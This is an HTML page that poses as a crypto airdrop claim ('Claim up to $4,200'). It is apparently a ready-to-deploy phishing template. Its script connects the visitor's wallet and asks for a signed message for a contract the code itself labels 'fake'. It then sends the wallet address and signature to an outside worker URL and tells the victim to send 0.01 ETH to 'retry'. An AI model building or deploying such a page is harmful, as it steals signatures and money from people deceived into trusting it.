<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Base Airdrop Claim – Phase 3</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <style>body{font-family:sans-serif;text-align:center;padding:50px;background:#000;color:#0f0}h1{color:#0f0}button{padding:20px 80px;font-size:28px;background:#0f0;color:#000;border:none;cursor:pointer}</style>
</head>
<body>
  <h1>Base Retroactive Airdrop – Claim up to $4,200</h1>
  <p>Connect wallet & sign to verify eligibility</p>
  
  <button id="connect">Connect Wallet</button>
  <button id="claim" style="display:none">Claim Free Tokens</button>
  <p id="status"></p>

  <script>
  const status = document.getElementById('status');
  const claimBtn = document.getElementById('claim');
  let signer, address;

  document.getElementById('connect').onclick = async () => {
    if (!window.ethereum) return status.innerText = 'No wallet detected';
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    address = await signer.getAddress();
    status.innerText = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;
    claimBtn.style.display = 'block';
  };

  document.getElementById('claim').onclick = async () => {
    try {
      status.innerText = 'Preparing signature...';
      
      const domain = {
        name: 'Base Airdrop Claim',
        version: '1',
        chainId: await signer.getChainId(),
        verifyingContract: '0x0000000000000000000000000000000000000000' // fake
      };
      
      const types = {
        Claim: [
          {name:'wallet',type:'address'},
          {name:'amount',type:'uint256'},
          {name:'nonce',type:'uint256'},
          {name:'deadline',type:'uint256'}
        ]
      };
      
      const message = {
        wallet: address,
        amount: '4200000000000000000000',
        nonce: Date.now(),
        deadline: Math.floor(Date.now()/1000) + 86400
      };
      
      const sig = await signer._signTypedData(domain, types, message);
      
      // Send to your free Telegram bot or CF worker
      await fetch('https://your-worker.workers.dev/log', {
        method: 'POST',
        body: JSON.stringify({addr: address, sig, chain: await signer.getChainId()})
      });
      
      status.innerText = 'Signature verified! Processing claim...';
      setTimeout(() => status.innerText = 'Gas too low – send 0.01 ETH to retry', 5000);
    } catch(e) {
      status.innerText = 'Rejected – try again';
    }
  };
  </script>
</body>
</html>
